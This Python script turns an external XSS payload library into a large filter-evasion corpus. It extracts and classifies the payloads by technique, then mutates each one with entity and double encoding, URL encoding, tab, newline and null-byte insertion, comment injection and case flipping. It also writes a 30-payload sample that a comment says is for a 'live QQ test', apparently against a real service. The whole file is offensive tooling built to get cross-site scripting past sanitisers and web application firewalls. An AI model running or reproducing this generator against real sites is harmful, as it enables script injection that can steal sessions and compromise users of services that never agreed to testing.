#!/usr/bin/env python3
# expand_payloads.py  (v2 - faithful to easyXssPayload.txt)
#
# Reads the REAL 1850-line easyXssPayload.txt, extracts the actual payloads
# (stripping any Chinese category prefix), de-duplicates, classifies by
# technique, then applies a battery of encoding / obfuscation / delimiter
# mutations to every real payload. The output is therefore genuinely derived
# from the source library, not from hand-picked seeds.
#
# Outputs:
#   payload_real_clean.txt  - the cleaned real origins (unique), grouped by class
#   payload_expanded.txt    - real origins + their mutations, deduped, capped
#   payload_sample_30.txt   - diverse 30-line slice (real payloads) for live QQ test
#
# Usage:
#   python expand_payloads.py --base "<easyXssPayload path>" --max 5000 --sample 30

import argparse
import os
import re
import sys

# ---------------------------------------------------------------------------
# Payload extraction: keep only the real vector, drop any leading label text.
# A payload is considered to start at the earliest of these markers.
# ---------------------------------------------------------------------------
MARKER_RE = re.compile(
    r'(?:'
    r'<'
    r'|javascript[:.]'
    r'|data:'
    r'|vbscript:'
    r'|on[a-z]+\s*='
    r'|"\s*\+'
    r"|'\s*\+"
    r'|alert\('
    r'|confirm\('
    r'|prompt\('
    r'|eval\('
    r'|document\.'
    r'|window\.'
    r'|location'
    r'|setTimeout'
    r'|setInterval'
    r')',
    re.I,
)

def extract_payload(line):
    """Return the XSS payload portion of a line, or None if none found."""
    s = line.strip()
    if not s:
        return None
    m = MARKER_RE.search(s)
    if not m:
        return None
    payload = s[m.start():].strip()
    # Drop a trailing stray '>' that sometimes clings to event-handler fragments
    # (e.g. "onfocus=top.alert(17)>") - keep it; it's harmless for a corpus.
    return payload if payload else None

def norm(s):
    """Normalization used only for de-duplication."""
    s = s.lower()
    s = re.sub(r'\s+', '', s)
    return s

# ---------------------------------------------------------------------------
# Technique classification (priority order: first match wins).
# ---------------------------------------------------------------------------
CLASS_RULES = [
    ("script-tag",      re.compile(r'<script[\s/>]', re.I)),
    ("svg",             re.compile(r'<svg[\s/>]', re.I)),
    ("img",             re.compile(r'<img[\s/>]', re.I)),
    ("body",            re.compile(r'<body[\s/>]', re.I)),
    ("iframe",          re.compile(r'<iframe[\s/>]', re.I)),
    ("object",          re.compile(r'<object[\s/>]', re.I)),
    ("embed",           re.compile(r'<embed[\s/>]', re.I)),
    ("video-audio",     re.compile(r'<(video|audio)[\s/>]', re.I)),
    ("details",         re.compile(r'<details[\s/>]', re.I)),
    ("marquee",         re.compile(r'<marquee[\s/>]', re.I)),
    ("style",           re.compile(r'<style[\s/>]', re.I)),
    ("meta",            re.compile(r'<meta[\s/>]', re.I)),
    ("math",            re.compile(r'<math[\s/>]', re.I)),
    ("table-bg",        re.compile(r'<table', re.I)),
    ("form",            re.compile(r'<(form|input|button|isindex|select|textarea)[\s/>]', re.I)),
    ("a-href-js",       re.compile(r'<a\b[^>]*\bhref\s*=\s*["\']?\s*(javascript|data)', re.I)),
    ("a-tag",           re.compile(r'<a[\s/>]', re.I)),
    ("event-handler",   re.compile(r'\bon[a-z]+\s*=', re.I)),
    ("javascript-uri",  re.compile(r'javascript[:.]', re.I)),
    ("js-context",      re.compile(r'(alert|confirm|prompt|eval|document\.|window\.|location|setTimeout|setInterval)\s*\(', re.I)),
    ("other-html",      re.compile(r'<[a-z]', re.I)),
    ("other",           re.compile(r'.')),
]

def classify(payload):
    for name, rx in CLASS_RULES:
        if rx.search(payload):
            return name
    return "other"

# ---------------------------------------------------------------------------
# Mutation transforms applied to every REAL payload.
# ---------------------------------------------------------------------------
def t_upper(s):
    return re.sub(r'(</?)([a-zA-Z]+)',
                  lambda m: m.group(1) + m.group(2).upper(),
                  re.sub(r'\s([a-zA-Z-]+)=', lambda m: ' ' + m.group(1).upper() + '=', s))

def t_lower(s):
    return re.sub(r'(</?)([a-zA-Z]+)', lambda m: m.group(1) + m.group(2).lower(), s)

def t_entity_special(s):
    out = s
    for ch, code in [('<', '&#60;'), ('>', '&#62;'), ('"', '&#34;'), ("'", '&#39;'),
                     ('(', '&#40;'), (')', '&#41;'), ('/', '&#47;')]:
        out = out.replace(ch, code)
    return out

def t_entity_full(s):
    return ''.join('&#%d;' % ord(c) if ord(c) < 128 else c for c in s)

def t_entity_double(s):
    once = t_entity_special(s)
    return once.replace('&#', '&#38;#').replace(';', '&#59;')

def t_url_key(s):
    out = s
    for ch, code in [('<', '%3c'), ('>', '%3e'), ('"', '%22'), ("'", '%27'),
                     ('(', '%28'), (')', '%29'), ('/', '%2f')]:
        out = out.replace(ch, code)
    return out

def t_url_all(s):
    return ''.join('%%%02x' % ord(c) if ord(c) < 128 else c for c in s)

def t_tab_in_tag(s):
    return re.sub(r'<([a-zA-Z]+)', lambda m: '<' + m.group(1)[0] + '%09' + m.group(1)[1:], s)

def t_lf_in_proto(s):
    return s.replace('javascript:', 'java\nscript:').replace('javascript:', 'java%0ascript:')

def t_comment_in_tag(s):
    return s.replace('<script>', '<script>/* */').replace('alert(', '/* */alert(')

def t_null_after_lt(s):
    return s.replace('<', '<%00')

def t_backslash_proto(s):
    return s.replace('javascript:', 'java\\tscript:').replace('javascript:', 'java\\x09script:')

def t_mixed_case(s):
    # flip case of tag & attribute names only (keeps JS identifiers intact)
    def flip(m):
        g = m.group(0)
        return g.swapcase()
    return re.sub(r'</?[a-zA-Z][a-zA-Z0-9]*|\s[a-zA-Z-]+(?==)', flip, s)

TRANSFORMS = [
    ("orig",            lambda s: s),
    ("upper",           t_upper),
    ("lower",           t_lower),
    ("mixed-case",      t_mixed_case),
    ("ent-special",     t_entity_special),
    ("ent-full",        t_entity_full),
    ("ent-double",      t_entity_double),
    ("url-key",         t_url_key),
    ("url-all",         t_url_all),
    ("tab-in-tag",      t_tab_in_tag),
    ("lf-in-proto",     t_lf_in_proto),
    ("comment-in-tag",   t_comment_in_tag),
    ("null-after-lt",   t_null_after_lt),
    ("backslash-proto", t_backslash_proto),
]

# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser()
    here = os.path.dirname(os.path.abspath(__file__))
    ap.add_argument("--base",
                    default=r"C:\Users\Administrator\Downloads\easyXssPayload-master\easyXssPayload.txt")
    ap.add_argument("--out", default=os.path.join(here, "payload_expanded.txt"))
    ap.add_argument("--clean-out", default=os.path.join(here, "payload_real_clean.txt"))
    ap.add_argument("--sample", type=int, default=30)
    ap.add_argument("--sample-out", default=os.path.join(here, "payload_sample_30.txt"))
    ap.add_argument("--max", type=int, default=5000)
    args = ap.parse_args()

    if not os.path.exists(args.base):
        print("ERROR: base file not found: %s" % args.base, file=sys.stderr)
        sys.exit(1)

    # --- 1. extract real payloads from the SOURCE file ---
    with open(args.base, "r", encoding="utf-8", errors="replace") as f:
        raw_lines = f.read().split("\n")

    seen_norm = set()
    real = []          # list of (class, payload) unique by normalized form
    cls_order = []

    for ln in raw_lines:
        p = extract_payload(ln)
        if not p:
            continue
        n = norm(p)
        if n in seen_norm:
            continue
        seen_norm.add(n)
        c = classify(p)
        if c not in cls_order:
            cls_order.append(c)
        real.append((c, p))

    print("Extracted unique real payloads : %d" % len(real))
    print("Technique classes              : %d -> %s" % (len(cls_order), cls_order))

    # --- 2. write the cleaned real set (originals only) ---
    with open(args.clean_out, "w", encoding="utf-8") as f:
        f.write("# Cleaned real payloads extracted from easyXssPayload.txt\n")
        f.write("# Total unique: %d | classes: %d\n\n" % (len(real), len(cls_order)))
        for c in cls_order:
            f.write("\n# === %s ===\n" % c)
            for cls, p in real:
                if cls == c:
                    f.write(p + "\n")

    # --- 3. expand: mutate every real payload ---
    seen_exp = set(seen_norm)   # originals already counted
    expanded = list(real)       # start from the real set

    for c, seed in real:
        for tname, fn in TRANSFORMS:
            if tname == "orig":
                continue
            try:
                res = fn(seed)
            except Exception:
                continue
            cands = res if isinstance(res, list) else [res]
            for cand in cands:
                cand = cand.strip()
                if not cand:
                    continue
                nn = norm(cand)
                if nn in seen_exp:
                    continue
                seen_exp.add(nn)
                expanded.append((c, cand))
                if len(expanded) >= args.max:
                    break
            if len(expanded) >= args.max:
                break
        if len(expanded) >= args.max:
            break

    print("Expanded total (capped at %d): %d" % (args.max, len(expanded)))

    # --- 4. write expanded corpus grouped by class ---
    with open(args.out, "w", encoding="utf-8") as f:
        f.write("# Expanded XSS corpus - FAITHFULLY derived from easyXssPayload.txt\n")
        f.write("# Real unique: %d | After mutation: %d | classes: %d\n\n"
                % (len(real), len(expanded), len(cls_order)))
        for c in cls_order:
            f.write("\n# === %s ===\n" % c)
            for cls, p in expanded:
                if cls == c:
                    f.write(p + "\n")

    # --- 5. build a diverse sample from the REAL payloads only ---
    sample = []
    per = max(1, args.sample // len(cls_order))
    for c in cls_order:
        items = [p for cls, p in real if cls == c]
        sample.extend(items[:per])
    if len(sample) < args.sample:
        for cls, p in real:
            if p not in sample:
                sample.append(p)
            if len(sample) >= args.sample:
                break
    sample = sample[:args.sample]
    with open(args.sample_out, "w", encoding="utf-8") as f:
        for p in sample:
            f.write(p + "\n")

    print("Sample (%d, real only)        -> %s" % (len(sample), args.sample_out))
    print("DONE.")

if __name__ == "__main__":
    main()
